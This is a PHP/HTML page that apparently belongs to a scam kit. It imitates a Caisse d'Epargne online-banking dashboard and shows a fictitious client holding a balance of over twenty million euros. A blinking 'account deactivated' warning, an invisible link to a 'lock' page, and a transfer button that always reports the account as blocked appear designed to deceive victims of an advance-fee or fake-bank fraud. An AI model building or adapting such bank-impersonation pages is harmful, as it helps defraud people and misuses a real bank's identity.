<?php
if (session_id() == "")
{
   session_start();
}
if (!isset($_SESSION['username']))
{
   header('Location: ./../access_deny.php');
   exit;
}
if (isset($_SESSION['expires_by']))
{
   $expires_by = intval($_SESSION['expires_by']);
   if (time() < $expires_by)
   {
      $_SESSION['expires_by'] = time() + intval($_SESSION['expires_timeout']);
   }
   else
   {
      unset($_SESSION['username']);
      unset($_SESSION['expires_by']);
      unset($_SESSION['expires_timeout']);
      header('Location: ./../access_deny.php');
      exit;
   }
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Banque et assurance</title>
<meta name="author" content="Pirvate Untherthered">
<meta name="robots" content="NOINDEX, NOFOLLOW">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="ulgn=b1.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="space"><br></div>
<div id="container">
<div id="wb_Shape9" style="position:absolute;left:8px;top:196px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:0;">
<a href=""><img class="hover" src="images/img0044_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0044.gif" id="Shape9" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Shape2" style="position:absolute;left:6px;top:15px;width:982px;height:566px;z-index:1;">
<img src="images/img0035.png" id="Shape2" alt="" style="width:982px;height:566px;"></div>
<div id="wb_Image1" style="position:absolute;left:8px;top:25px;width:260px;height:60px;z-index:2;">
<img src="images/national_logo.png" id="Image1" alt=""></div>
<div id="wb_CssMenu1" style="position:absolute;left:7px;top:85px;width:1020px;height:74px;z-index:3;">
<ul>
<li class="firstmain"><a href="#" target="_self">Ma&nbsp;synth&#232;se</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;comptes</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;cr&#233;dits</a>
</li>
<li><a href="#" target="_self">Mon&nbsp;&#233;pargne</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;assurances</a>
</li>
</ul>
<br>
</div>
<div id="wb_Image2" style="position:absolute;left:846px;top:23px;width:17px;height:17px;z-index:4;">
<img src="images/locked-1.png" id="Image2" alt=""></div>
<div id="wb_Shape1" style="position:absolute;left:6px;top:588px;width:982px;height:203px;filter:alpha(opacity=50);-moz-opacity:0.50;opacity:0.50;z-index:5;">
<img src="images/img0036.png" id="Shape1" alt="" style="width:982px;height:203px;"></div>
<div id="wb_Image3" style="position:absolute;left:13px;top:603px;width:232px;height:164px;z-index:6;">
<img src="images/allocation-pilotee-equilibre_push_marketing.gif" id="Image3" alt=""></div>
<div id="wb_Image4" style="position:absolute;left:255px;top:603px;width:232px;height:164px;z-index:7;">
<img src="images/livrets-a-connecter_push_marketing.gif" id="Image4" alt=""></div>
<div id="wb_Image5" style="position:absolute;left:498px;top:603px;width:232px;height:164px;z-index:8;">
<img src="images/diversifiez-vos-placements-dans-l-immobilier_push_marketing.gif" id="Image5" alt=""></div>
<div id="wb_Image6" style="position:absolute;left:745px;top:603px;width:232px;height:164px;z-index:9;">
<img src="images/preuve-coloc_push_marketing.gif" id="Image6" alt=""></div>
<div id="wb_Image7" style="position:absolute;left:23px;top:826px;width:257px;height:269px;z-index:10;">
<img src="images/search-france-big.png" id="Image7" alt=""></div>
<div id="wb_Text1" style="position:absolute;left:374px;top:912px;width:591px;height:23px;z-index:11;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:20px;">Rendez-vous sur le site de la Caisse d'Epargne de votre région</span></div>
<div id="wb_Text2" style="position:absolute;left:375px;top:946px;width:552px;height:48px;z-index:12;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Afin de proposer des solutions adaptées aux besoins de chacun, la Caisse d'Epargne s'appuie sur les conseils personnalisés de son réseau d'experts, répartis dans ses 17 Caisses régionales.</span></div>
<div id="wb_Shape3" style="position:absolute;left:7px;top:1105px;width:970px;height:3px;filter:alpha(opacity=50);-moz-opacity:0.50;opacity:0.50;z-index:13;">
<img src="images/img0037.png" id="Shape3" alt="" style="width:970px;height:3px;"></div>
<div id="wb_Text3" style="position:absolute;left:7px;top:1119px;width:248px;height:192px;z-index:14;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>BANQUE AU QUOTIDIEN</strong></span><span style="color:#696969;font-family:Arial;font-size:13px;"><strong><br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Ouvrir un compte bancaire<br>Gérer ses comptes<br>Carte Bancaire<br>Carte Bancaire Rechargeable<br>Transmission - Successions<br>Comprendre les frais bancaires<br>Garantie des dépôts<br>Comptes inactifs et déshérence<br>Echange d’informations fiscales<br>Tarifs et informations réglementaires</strong></span></div>
<div id="wb_Text4" style="position:absolute;left:280px;top:1119px;width:250px;height:144px;z-index:15;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>AIDE ET OUTILS PRATIQUES<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Contacts - numéros utiles<br>Assistance perte et vol / Opposition<br>Focus - «&nbsp;Tout savoir sur…&nbsp;»<br>Guides Pratiques<br>FAQ<br>Mentions légales<br>Sécurité</strong></span></div>
<div id="wb_Text5" style="position:absolute;left:530px;top:1119px;width:250px;height:176px;z-index:16;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>PROFESSIONNELS<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Outils et services pros<br>Compte professionnel<br>Prévenir le risque de fraude<br>Entreprises<br>Associations / Economie sociale<br>Secteur Public<br>Logement Social<br>Immobilier Professionnel<br>E-remises</strong></span></div>
<div id="wb_Text6" style="position:absolute;left:762px;top:1119px;width:250px;height:160px;z-index:17;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>LA CAISSE D’EPARGNE ET VOUS<br></strong><br></span><span style="color:#696969;font-family:Arial;font-size:13px;">Nous connaitre<br>Fédération Nationale (FNCE)<br>Sponsoring - Mécénat<br>Recrutement<br>Site Sociétaires<br>Décideurs en Région<br>Horizon Entrepreneurs<br>Changer de Caisse</span></div>
<div id="wb_Image8" style="position:absolute;left:789px;top:1063px;width:32px;height:32px;z-index:18;">
<a href="#"><img src="images/facebook.png" id="Image8" alt=""></a></div>
<div id="wb_Image9" style="position:absolute;left:831px;top:1063px;width:32px;height:32px;z-index:19;">
<a href="#"><img src="images/twitter.png" id="Image9" alt=""></a></div>
<div id="wb_Image10" style="position:absolute;left:874px;top:1063px;width:32px;height:32px;z-index:20;">
<a href="#"><img src="images/instagram.png" id="Image10" alt=""></a></div>
<div id="wb_Shape4" style="position:absolute;left:9px;top:154px;width:612px;height:34px;z-index:21;">
<a href=""><img class="hover" src="images/img0038_hover.png" alt="" style="border-width:0;width:612px;height:34px;"><span><img src="images/img0038.png" id="Shape4" alt="" style="width:612px;height:34px;"></span></a></div>
<div id="wb_Text7" style="position:absolute;left:12px;top:139px;width:256px;height:16px;z-index:22;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:13px;"><strong>Ma synthèse</strong></span></div>

<div id="wb_Shape6" style="position:absolute;left:631px;top:267px;width:357px;height:34px;z-index:24;">
<a href=""><img class="hover" src="images/img0039_hover.png" alt="" style="border-width:0;width:357px;height:34px;"><span><img src="images/img0039.png" id="Shape6" alt="" style="width:357px;height:34px;"></span></a></div>
<div id="wb_Text9" style="position:absolute;left:643px;top:308px;width:307px;height:96px;z-index:25;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Cliquez ici pour accéder à vos souscriptions initiées par téléphone ou sur Internet en cours de finalisation. Suivez également l’avancement de votre crédit immobilier.<br><br>Voir mes demandes en cours</span></div>
<div id="wb_Text10" style="position:absolute;left:644px;top:475px;width:263px;height:54px;z-index:26;text-align:left;">
<div><span style="color:#000000;font-family:Arial;font-size:13px;">Mon conseiller&nbsp;: </span></div>
<div style="line-height:19px;"><span style="color:#000000;font-family:Arial;font-size:13px;"><strong>M. Dufreille Claude</strong></span></div>
<div style="line-height:16px;"><span style="color:#000000;font-family:Arial;font-size:13px;"><strong>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; </strong>01 23 70 02 89 (appel non surtaxé)</span></div>
</div>
<div id="wb_Text8" style="position:absolute;left:15px;top:201px;width:243px;height:32px;z-index:27;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>CPT DEPOT PART</strong>.&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; 043881XXXXX	&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; </span></div>
<div id="wb_Shape8" style="position:absolute;left:629px;top:154px;width:359px;height:427px;z-index:28;">
<img src="images/img0040.png" id="Shape8" alt="" style="width:359px;height:427px;"></div>
<div id="wb_Shape5" style="position:absolute;left:631px;top:154px;width:357px;height:34px;z-index:29;">
<a href=""><img class="hover" src="images/img0041_hover.png" alt="" style="border-width:0;width:357px;height:34px;"><span><img src="images/img0041.png" id="Shape5" alt="" style="width:357px;height:34px;"></span></a></div>
<div id="wb_Shape7" style="position:absolute;left:631px;top:428px;width:357px;height:34px;z-index:30;">
<a href=""><img class="hover" src="images/img0042_hover.png" alt="" style="border-width:0;width:357px;height:34px;"><span><img src="images/img0042.png" id="Shape7" alt="" style="width:357px;height:34px;"></span></a></div>
<div id="wb_Image11" style="position:absolute;left:644px;top:505px;width:24px;height:24px;z-index:31;">
<img src="images/telephone-receiver-with-circular-arrows.png" id="Image11" alt=""></div>
<input type="button" id="Button1" onclick="window.confirm('Impossible d effectuer un virement votre compte a ete desactiver');return false;" name="" value="Effectuer un virement" style="position:absolute;left:13px;top:272px;width:137px;height:25px;z-index:32;">
<div id="wb_Text11" style="position:absolute;left:15px;top:230px;width:86px;height:16px;z-index:33;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>Encours CB&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; </strong></span></div>
<div id="wb_Shape10" style="position:absolute;left:6px;top:246px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:34;">
<a href=""><img class="hover" src="images/img0043_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0043.gif" id="Shape10" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Shape11" style="position:absolute;left:13px;top:305px;width:612px;height:34px;z-index:35;">
<a href=""><img class="hover" src="images/img0045_hover.png" alt="" style="border-width:0;width:612px;height:34px;"><span><img src="images/img0045.png" id="Shape11" alt="" style="width:612px;height:34px;"></span></a></div>
<div id="wb_Text12" style="position:absolute;left:14px;top:343px;width:254px;height:16px;z-index:36;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Mon épargne disponible</span></div>
<div id="wb_Text13" style="position:absolute;left:14px;top:373px;width:162px;height:16px;z-index:37;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>LIVRET A 013751XXXXX</strong></span></div>
<div id="wb_Text14" style="position:absolute;left:14px;top:400px;width:244px;height:16px;z-index:38;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Mes plans et contrats d'épargne</span></div>
<div id="wb_Text15" style="position:absolute;left:15px;top:428px;width:161px;height:34px;z-index:39;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>PEL&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; A 013751XXXXX	&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; </strong><br></span></div>
<div id="wb_Text16" style="position:absolute;left:15px;top:472px;width:253px;height:16px;z-index:40;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Mes titres</span></div>
<div id="wb_Text17" style="position:absolute;left:13px;top:502px;width:234px;height:32px;z-index:41;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">COMPTE TITRES	300613XXXXX	&nbsp;&nbsp; </span></div>
<div id="wb_Image12" style="position:absolute;left:638px;top:159px;width:22px;height:22px;filter:alpha(opacity=70);-moz-opacity:0.70;opacity:0.70;z-index:42;">
<img src="images/info.png" id="Image12" alt=""></div>
<div id="wb_Text19" style="position:absolute;left:280px;top:49px;width:250px;height:17px;z-index:43;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:15px;">Particuliers&nbsp; </span><span style="color:#000000;font-family:Arial;font-size:15px;">| Professionnels</span></div>
<div id="wb_Shape14" style="position:absolute;left:268px;top:47px;width:92px;height:22px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:44;">
<a href=""><img class="hover" src="images/img0048_hover.gif" alt="" style="border-width:0;width:92px;height:22px;"><span><img src="images/img0048.gif" id="Shape14" alt="" style="width:92px;height:22px;"></span></a></div>
<div id="wb_Shape15" style="position:absolute;left:836px;top:19px;width:152px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:45;">
<a href="./../index.html" title="Deconnexion"><img class="hover" src="images/img0049_hover.gif" alt="" style="border-width:0;width:152px;height:28px;"><span><img src="images/img0049.gif" id="Shape15" alt="" style="width:152px;height:28px;"></span></a></div>
<div id="wb_Text20" style="position:absolute;left:874px;top:24px;width:250px;height:16px;z-index:46;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Déconnexion</span></div>
<div id="wb_JavaScript1" style="position:absolute;left:685px;top:203px;width:252px;height:66px;z-index:47;">
<script type="text/javascript">

var blink = 0;
 
function Blink(id)
{
   if (blink%2==0)
   {
      eval('document.getElementById("' + id + '").style.display=""');
   }
   else
   {
      eval('document.getElementById("' + id + '").style.display="none"');
   }
   if (blink<1)
   {
      blink++;
   } 
   else
   {
      blink--;
   }
   setTimeout("Blink('"+id+"')", 100);
}
document.write('<div id="wb_blink" style="display:none;color:#FF0000;font-size:12px;font-family:Arial;font-weight:normal;font-style:normal;text-align:left;text-decoration:none">Votre compte a été desactivé cliquez ici pour en savoir plus<\/div>');
Blink('wb_blink');
</script>
</div>
<div id="wb_Shape16" style="position:absolute;left:642px;top:191px;width:335px;height:81px;filter:alpha(opacity=0);-moz-opacity:0.00;opacity:0.00;z-index:48;">
<a href="./msg/ms=lck.php"><img src="images/img0061.png" id="Shape16" alt="" style="width:335px;height:81px;"></a></div>
<div id="wb_Text18" style="position:absolute;left:256px;top:202px;width:118px;height:16px;z-index:49;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">M. Claude Jaquel</span></div>
<div id="wb_Shape17" style="position:absolute;left:12px;top:196px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:50;">
<a href=""><img class="hover" src="images/img0046_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0046.gif" id="Shape17" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Text21" style="position:absolute;left:515px;top:202px;width:128px;height:16px;z-index:51;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">+20 870 130,87€</span></div>
<div id="wb_Text22" style="position:absolute;left:255px;top:373px;width:118px;height:16px;z-index:52;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">M. Claude Jaquel</span></div>
<div id="wb_Text23" style="position:absolute;left:540px;top:373px;width:128px;height:16px;z-index:53;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">+70 130,87€</span></div>
<div id="wb_Text24" style="position:absolute;left:255px;top:428px;width:118px;height:16px;z-index:54;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">M. Claude Jaquel</span></div>
<div id="wb_Text25" style="position:absolute;left:540px;top:428px;width:75px;height:16px;z-index:55;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">&nbsp;&nbsp; + 130,87€</span></div>
<div id="wb_Text26" style="position:absolute;left:540px;top:230px;width:75px;height:16px;z-index:56;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">&nbsp;&nbsp; + 130,87€</span></div>
<div id="wb_Shape12" style="position:absolute;left:6px;top:224px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:57;">
<a href=""><img class="hover" src="images/img0047_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0047.gif" id="Shape12" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Shape13" style="position:absolute;left:6px;top:368px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:58;">
<a href=""><img class="hover" src="images/img0063_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0063.gif" id="Shape13" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Shape18" style="position:absolute;left:6px;top:423px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:59;">
<a href=""><img class="hover" src="images/img0064_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0064.gif" id="Shape18" alt="" style="width:609px;height:28px;"></span></a></div>
<div id="wb_Text27" style="position:absolute;left:256px;top:502px;width:118px;height:16px;z-index:60;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">M. Claude Jaquel</span></div>
<div id="wb_Text28" style="position:absolute;left:531px;top:502px;width:119px;height:16px;z-index:61;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">&nbsp;&nbsp; + 4 030,87€</span></div>
<div id="wb_Shape19" style="position:absolute;left:9px;top:494px;width:609px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:62;">
<a href=""><img class="hover" src="images/img0065_hover.gif" alt="" style="border-width:0;width:609px;height:28px;"><span><img src="images/img0065.gif" id="Shape19" alt="" style="width:609px;height:28px;"></span></a></div>
</div>
</body>
</html>